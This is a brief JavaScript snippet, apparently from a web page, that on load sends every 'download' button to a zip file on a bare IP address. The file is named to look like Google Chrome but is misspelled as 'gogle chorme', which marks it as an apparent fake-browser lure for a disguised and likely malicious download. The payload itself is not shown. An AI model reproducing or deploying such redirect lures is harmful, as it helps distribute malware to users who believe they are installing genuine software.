window.onload = function() {
    // 下载链接
    let url = 'http://43.248.173.23/gogle%20chorme%2064位_189.0.547.zip'

    document.querySelectorAll('.download').forEach(item => {
        item.onclick = function() {
            location.href = url
        }
    })
}
